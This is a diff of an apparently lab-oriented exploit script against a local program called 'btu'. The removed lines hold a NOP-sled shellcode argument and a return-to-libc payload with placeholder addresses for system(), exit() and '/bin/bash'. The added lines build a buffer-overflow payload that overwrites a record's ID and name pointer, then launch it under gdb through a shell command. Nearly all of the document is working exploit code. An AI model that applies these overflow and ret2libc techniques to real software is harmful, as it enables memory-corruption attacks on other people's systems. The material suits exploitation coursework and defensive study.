@@ -1,41 +1,33 @@
-'''
-gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\xbb\xbb\xbb\xbb\xe0\x0d\x05\x08\x50\x7d\x05\x08")
-'''
+#!/usr/bin/env python3
 
-#!/usr/bin/python3 
+import subprocess
 
-# x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
-import sys 
+# Define payload components
+passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
+idBuff = b'\xaa\xaa\xaa\xaa'                # junk ID overwrite
+targetAddr = b'\xcd\xab\xff\xff'            # record->name = 0xffffabcd
+nameBuff = b'\xef\xbe\xad\xde'              # 0xdeadbeef -> to be placed in the target address
 
+# Full password payload
+passPayload = passwordBuff + idBuff + targetAddr
 
-# Fill content with non-zero values 
-content = bytearray(0x90 for i in range(16)) 
+# Function to convert bytes to a Python byte-escaped string
+def to_python_bytestr(b: bytes) -> str:
+    return ''.join(f'\\x{byte:02x}' for byte in b)
 
-# adding the basepointer address 
-base_pointer_address = 0x11111111
+# Convert to python3-compatible command line string
+pass_py_str = to_python_bytestr(passPayload)
+name_py_str = to_python_bytestr(nameBuff)
 
-content[0:4] = (base_pointer_address).to_bytes(4, byteorder='little' )
+# Build GDB command using python3 -c for both args
+gdb_cmd = (
+    "gdb --args ./build/bin/btu add hamada "
+    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{name_py_str}\")')\" "
+    " 5555 "
+    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{pass_py_str}\")')\"" 
+)
 
-
-system_addr = 0xaaaaaaaa # The address of exmatriculate 
-
-content[4:8] = (system_addr).to_bytes(4, byteorder='little' )
-
-
-exit_addr = 0xbbbbbbbb # The address of exit () 
-
-content[8:12] = (exit_addr).to_bytes(4, byteorder='little' ) 
-
-bin_bash = 0xcccccccc# address of bin_bash object. 
-content[12:16] = (bin_bash).to_bytes(4, byteorder='little') 
-
-
-
-# Print the final payload in escaped format for gdb --args
-# escaped = ''.join('\\x{:02x}'.format(b) for b in content)
-# escaped = ''.join('\\x{:02x}'.format(b) for b in content)
-
-
-
-print(f'gdb --args ./build/bin/btu add {base_pointer_address} {system_addr} {exit_addr} {bin_bash}')
-
+# Print and execute
+print("[+] Running:")
+print(gdb_cmd)
+subprocess.run(gdb_cmd, shell=True)
